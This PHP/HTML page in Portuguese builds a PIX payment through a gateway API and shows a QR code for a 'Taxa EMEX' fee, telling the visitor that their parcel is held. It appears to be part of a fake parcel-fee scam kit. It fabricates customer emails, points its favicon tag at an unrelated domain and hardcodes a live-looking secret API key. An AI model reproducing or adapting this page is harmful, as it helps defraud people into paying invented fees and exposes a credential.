<?php
session_start();

$secretKey = 'sk_live_v2qK4BpEN6mULeCvB1i4Hy8P9Wwpde84snBQ58vIDG';

// Se não houver dados na sessão, tenta pegar via GET
if (!isset($_SESSION['dadosBasicos'])) {
    if (isset($_GET['nome'], $_GET['cpf'], $_GET['value'])) {
        $_SESSION['dadosBasicos'] = [
            'nome'  => $_GET['nome'],
            'cpf'   => preg_replace('/\D/', '', $_GET['cpf']), // só números
            'value' => (float) $_GET['value']
        ];
    } else {
        die("Erro: Dados insuficientes para gerar pagamento.");
    }
}

// --- Verifica se já existe transação na sessão ---
if ($tempoPassado > 300) { // mais de 5 minutos
    unset($_SESSION['transaction_data']);
}


// --- Se não existir transação válida, cria uma nova ---
if (!isset($_SESSION['transaction_data'])) {
    $nome = $_SESSION['dadosBasicos']['nome'];
    $cpf = $_SESSION['dadosBasicos']['cpf'];
    $value = $_SESSION['dadosBasicos']['value'];

    $idAleatorio = random_int(1000, 9999);
    $email = str_replace(' ', '', $nome) . $idAleatorio . "@gmail.com";

    $data = [
        'amount' => (int)($value),
        'paymentMethod' => 'pix',
        'customer' => [
            'name' => $nome,
            'email' => $email,
            'document' => [
                'number' => $cpf,
                'type' => 'cpf'
            ],
        ],
        'items' => [
            [
                'title' => 'Taxa EMEX',
                'unitPrice' => (int)($value),
                'quantity' => 1,
                'tangible' => false,
            ]
        ],
        'pix' => [
            'expiresInDays' => 1 // API exige dias, mas vamos limitar em 5min no front
        ]
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.bestfybr.com.br/v1/transactions',
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            'Authorization: Basic ' . base64_encode($secretKey . ':x'),
            'Content-Type: application/json',
        ]
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) die('Erro na conexão: ' . $error);
    if ($httpCode < 200 || $httpCode >= 300) die('Erro HTTP: ' . $httpCode);

    $result = json_decode($response, true);

    if (!isset($result['id']) || !isset($result['pix']['qrcode'])) {
        die('Erro ao gerar PIX. Detalhes: ' . json_encode($result));
    }

    $_SESSION['transaction_data'] = [
        'transactionId'  => $result['id'],
        'pix'            => $result['pix'],
        'qrCode'         => $result['pix']['qrcode_image'] ?? 
            'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=' . urlencode($result['pix']['qrcode']),
        'createdAt'      => time()
    ];
}

// Recupera dados da sessão
$transaction   = $_SESSION['transaction_data'];
$transactionId = $transaction['transactionId'];
$pix           = $transaction['pix'];
$qrCodeImageUrl = $transaction['qrCode'];
$paymentCode    = $pix['qrcode'];
$value          = $_SESSION['dadosBasicos']['value'];
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>



  
<!-- Meta Pixel Code -->
<script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevennaoquerots.js');
    fbq('init', '1193827naoquero845743968');
    fbq('track', 'InitiateCheckout');
    </script>
    <noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=11naoquero43968&ev=Initiatenaoqueroeckout&noscript=1"
    /></noscript>
    <!-- End Meta Pixel Code -->
    
    
    <script>
      window.pixelId = "670dnaoquero74746279730c8";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/naoquero/pnaoquero.js");
      document.head.appendChild(a);
    </script>
    
    
    
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>


    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento PIX</title>

    <link rel="shortcut icon" href="../public/images/favicon.ico">
<link rel="shortcut icon" href="../public/images/favicon.ico">
<link rel="icon" href="../public/images/favicon.ico" sizes="32x32">
<link rel="icon" href="../public/images/favicon.ico" sizes="192x192">
<link rel="apple-touch-icon" href="../public/images/favicon.ico">
<meta name="msapplication-TileImage" content="https://ajudeocantinho.site/public/images/favicon.ico">
<link href="../public/css/swiper-bundle.min.css" rel="stylesheet">
<link href="../public/css/bootstrap.min.css" rel="stylesheet">
<link href="../public/css/all.min.css" rel="stylesheet">
<link href="../public/css/style.css?v=1.0.3" rel="stylesheet">




    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #f3f4f6;
            min-height: 100vh;
        }

        /* Estilos da tela de loading */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 1;
            transition: opacity 0.5s ease;
        }

        .loading-screen.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .loading-logo {
            max-width: 200px;
            max-height: 100px;
            margin-bottom: 30px;
            object-fit: contain;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #FA0000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            color: #FA0000;
            font-size: 24px;
            font-weight: 600;
            letter-spacing: 1px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Seus estilos existentes */
        .top-bar {
            background-color: white;
            border-bottom: 1px solid #e5e7eb;
            padding: 12px 0;
        }

        .top-bar-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            height: 32px;
        }

        .secure-badge {
            display: flex;
            align-items: center;
            color: #FA0000;
            font-size: 14px;
            font-weight: 500;
        }

        .secure-badge svg {
            margin-right: 8px;
        }

        .container {
            max-width: 28rem;
            margin: 0 auto;
            padding: 16px;
        }

        .card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            padding: 24px;
            margin-top: 16px;
        }

        .text-center {
            text-align: center;
        }

        .title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 16px;
        }

        .timer {
            color: #6b7280;
            margin-bottom: 8px;
        }

        .timer span {
            color: #ef4444;
            font-weight: bold;
        }

        .info-box {
            background-color: #eff6ff;
            border: 1px solid #dbeafe;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 24px;
        }

        .info-box p {
            color: #1e40af;
            font-size: 14px;
        }

        .pix-value {
            margin-bottom: 24px;
        }

        .pix-value-label {
            color: #6b7280;
            margin-bottom: 8px;
        }

        .pix-amount {
            color: #FA0000;
            font-size: 24px;
            font-weight: bold;
        }

        .pix-input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            background-color: #f9fafb;
            color: #6b7280;
            margin-bottom: 8px;
        }

        .copy-button {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background-color: #FA0000;
            color: white;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.2s;
        }

        .copy-button:hover {
            background-color: #059669;
        }

        .copy-button svg {
            margin-right: 8px;
        }

        .instructions {
            margin-top: 32px;
        }

        .instruction-item {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 16px;
        }

        .instruction-item svg {
            flex-shrink: 0;
            color: #6b7280;
        }

        .instruction-text {
            color: #6b7280;
        }

        .status {
            margin-top: 32px;
            color: #6b7280;
            font-style: italic;
        }

        .animate-dots::after {
            content: '...';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80% { content: '...'; }
        }

        .divider {
            border-top: 1px solid #e5e7eb;
            margin: 32px 0;
        }
    </style>

</head>

<body cz-shortcut-listen="true">


    <div class="top-bar">
        <div class="top-bar-content">
            <img src="logo.png" alt="Logo" class="logo">
            <div class="secure-badge">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M9 12l2 2 4-4"></path>
                    <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                <span>Ambiente seguro</span>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="card">
            <div class="text-center">
                <h1 class="title">Tarifa Produto</h1>
            </div>

            <div class="info-box" style="text-align:center;">
                <p>Sua encomenda está Retida</p>
            </div>

            <div class="pix-value" style="text-align:center; margin-bottom:16px;">
                <p style="color:#545454; margin:0;">
                    Valor do PIX: Taxa EMEX + Liberação
                </p>
                <p style="color:red; font-weight:bold; font-size:22px; margin:4px 0 0 0;">
                    R$ <?php echo number_format($value/100, 2, ',', '.'); ?>
                </p>
            </div>

            <div id="qr-container" style="position:relative; text-align:center; margin:20px 0;">
    <!-- Aqui começa com o PIX válido -->
    <img src="<?php echo $qrCodeImageUrl; ?>" alt="QR Code PIX" style="display:block; margin:20px auto;">
    <input type="text" class="pix-input" value="<?php echo htmlspecialchars($paymentCode); ?>" readonly id="pixCopiaCola">
    <button id="copyButton" class="copy-button">Copiar código</button>
</div>


            <!-- Elemento para exibir a contagem regressiva -->
            <div id="countdown" style="font-size: 18px; font-weight: bold; text-align: center; margin-top: 10px;"></div>

            <div class="instructions">
                <h2 class="title">Pagar seu pedido com PIX</h2>
                <div class="instruction-item">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
                        <path d="M12 18h.01"></path>
                    </svg>
                    <p class="instruction-text">Copie o código acima.</p>
                </div>
                <div class="instruction-item">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        <path d="M9 12l2 2 4-4"></path>
                    </svg>
                    <p class="instruction-text">Selecione a opção PIX Copia e Cola no aplicativo onde você tem o PIX habilitado.</p>
                </div>
                <div class="instruction-item">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <polyline points="9 11 12 14 22 4"></polyline>
                        <path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11"></path>
                    </svg>
                    <p class="instruction-text">Alguns segundos após o pagamento, a confirmação chega pra gente.</p>
                </div>
              
             
            </div>
        </div>
    </div>



    <script>
    

        // Função de contagem regressiva (30 minutos = 1800 segundos)
        function startTimer(duration) {
            let timer = duration;
            const countdownElement = document.getElementById('countdown');
            
            const interval = setInterval(() => {
                const minutes = Math.floor(timer / 60);
                const seconds = timer % 60;

                countdownElement.textContent = minutes.toString().padStart(2, '0') + ':' + 
                                               seconds.toString().padStart(2, '0');

                if (--timer < 0) {
                    clearInterval(interval);
                    countdownElement.textContent = "PIX expirado!";

                    // Troca o QR code para versão esmaecida + overlay
                    const qrDiv = document.querySelector("#qr-container");
                    if (qrDiv) {
                        qrDiv.innerHTML = `
                            <div style="position:relative; display:inline-block;">
                                <img src="<?php echo $qrCodeImageUrl; ?>" alt="QR Code PIX" style="opacity:0.2; filter:blur(2px);">
                                <div style="
                                    position:absolute;
                                    top:50%;
                                    left:50%;
                                    transform:translate(-50%,-50%);
                                    display:flex;
                                    align-items:center;
                                    justify-content:center;
                                    width:350px;
                                    height:350px;
                                    background: radial-gradient(circle, rgba(255,255,255,1) 0%, rgba(255,255,255,0) 70%);
                                    border-radius:50%;
                                ">
                                    <img src="images/pixexpirado.png" alt="PIX expirado" style="width:120px; z-index:2;">
                                </div>
                            </div>
                        `;
                    }

                    // Troca o input
                    const input = document.getElementById("pixCopiaCola");
                    if (input) {
                        input.value = "Código PIX expirado!";
                        input.style.color = "#adabb2";
                        input.setAttribute("disabled", "true");
                    }

                    // Troca o botão
                    const btn = document.getElementById("copyButton");
                    if (btn) {
                        btn.innerText = "Gerar novamente";
                        btn.onclick = function() {
                            window.location.href =
                                "index.php?nome=<?=urlencode($_SESSION['dadosBasicos']['nome'])?>&cpf=<?=urlencode($_SESSION['dadosBasicos']['cpf'])?>&value=<?=urlencode($_SESSION['dadosBasicos']['value'])?>";
                        };
                    }
                }
            }, 1000);
        }

        // Função para copiar o código PIX
        document.getElementById('copyButton').addEventListener('click', async () => {
            const pixCode = document.getElementById('pixCopiaCola').value;
            try {
                await navigator.clipboard.writeText(pixCode);
                const button = document.getElementById('copyButton');
                const originalContent = button.innerHTML;
                button.innerHTML = `
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    <span>Copiado!</span>
                `;
                button.style.backgroundColor = '#FA0000';
                setTimeout(() => {
                    button.innerHTML = originalContent;
                    button.style.backgroundColor = '#FA0000';
                }, 2000);
            } catch (err) {
                console.error('Falha ao copiar:', err);
            }
        });

        // Inicia o timer quando a página é carregada, padrao de 5min é 300, coloquei 10 para teste 
        startTimer(10);
    </script>

    <!-- Inclua o jQuery antes do seu script -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Se estiver usando o toastr, inclua-o também -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
    <script>
        $(document).ready(function () {
            // Função para obter parâmetros da URL
            function getUrlParameter(name) {
                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
                var regex = new RegExp('[\\?&]' + name + '=([^&#]*)'),
                    results = regex.exec(location.search);
                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
            }

            // Atualiza o valor do PIX a partir do parâmetro 'value'
            var valueParam = getUrlParameter('value');
            if (valueParam) {
                $('.pix-amount').text('R$ ' + valueParam);
            }

            // Verifica o token para confirmação de pagamento
            var token = getUrlParameter('token');
            if (!token) {
                console.error("Token não encontrado na URL.");
                return;
            }

            // Verifica o status do pagamento a cada 3 segundos
            setInterval(function () {
                if (token) {
                    $.ajax({
                        type: 'POST',
                        url: "confirmar-pagamento.php",
                        dataType: 'json',
                        contentType: 'application/json',
                        data: JSON.stringify({ idtransaction: token }),
                        success: function (resp) {
                            console.log(resp.status);
                            if (resp.status === "APPROVED") {
                                console.log("Pagamento realizado com sucesso.");
                                toastr.success("Pagamento aprovado com sucesso!", "Aprovação de Pagamento");
                                setTimeout(function () {
                                    window.location.href = "/obrigado/";
                                }, 2000);
                            } else if (resp.status === "PENDING") {
                                console.log("Pagamento ainda aguardando aprovação.");
                            } else {
                                console.log("Status inesperado: " + resp.status);
                            }
                        },
                        error: function (xhr, status, error) {
                            console.error("Erro na requisição:", error);
                        }
                    });
                } else {
                    console.error("Token não definido.");
                }
            }, 3000);
        });
    </script>


</body>
</html>
